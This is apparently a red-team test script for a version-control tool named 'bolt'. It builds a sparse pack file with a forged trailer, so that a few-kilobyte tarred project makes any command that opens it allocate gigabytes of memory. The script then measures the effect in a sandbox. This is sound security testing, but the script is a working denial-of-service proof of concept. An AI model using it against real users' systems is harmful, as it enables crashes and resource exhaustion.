#!/bin/sh
# RT2-5: a pack's index is read whole into memory, capped only by the file's size. A sparse
# file costs nothing on disk and survives `tar --sparse`, so a few-KB archive makes every
# command that opens the project allocate gigabytes. Run in the sandbox from /work:
#   sh redteam/attacks2/sparse-pack.sh [bolt] [GiB]
set -u
BOLT=${1:-/tmp/t/release/bolt}
GIB=${2:-5}
export BOLT_USER_NAME=T BOLT_USER_EMAIL=t@example.com BOLT_CONFIG_DIR=/tmp/sp-cfg
mkdir -p "$BOLT_CONFIG_DIR"
d=$(mktemp -d); cd "$d" || exit 1
"$BOLT" start >/dev/null
python3 -I - "$GIB" <<'EOF'
import struct, sys
size = int(sys.argv[1]) << 30
with open(".bolt/store/packs/zz.pack", "wb") as f:
    f.write(b"BOLTPACK" + struct.pack("<II", 1, 0))        # header: magic, version 1, flags 0
    f.truncate(size)                                        # a hole: the "index", never written
    f.seek(size - 48)
    f.write(struct.pack("<Q", 16) + bytes(32) + b"BOLTPEND")  # trailer: index right after header
EOF
echo "pack: $(stat -c %s .bolt/store/packs/zz.pack) bytes apparent, $(du -k .bolt/store/packs/zz.pack | cut -f1) KB on disk"
tar --sparse -czf /tmp/sp.tgz .bolt && echo "tar --sparse -czf of .bolt: $(stat -c %s /tmp/sp.tgz) bytes"
python3 -I /work/redteam/attacks2/measure.py 120 "$d" "$BOLT" history
cd / && rm -rf "$d" /tmp/sp.tgz
